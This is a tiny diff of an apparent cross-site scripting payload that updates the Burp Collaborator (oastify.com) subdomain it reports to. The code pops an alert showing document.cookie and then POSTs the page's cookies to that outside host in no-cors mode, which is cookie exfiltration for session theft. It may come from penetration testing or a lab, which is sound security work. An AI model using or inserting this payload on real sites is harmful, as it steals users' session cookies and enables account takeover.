@@ -1,5 +1,5 @@
 alert(document.cookie);
-fetch('http://2dgfdz4429estq5vpti4bz1modubi0.oastify.com/', {
+fetch('http://9s2bti26zxknom9begl2nro66xcp0e.oastify.com/', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
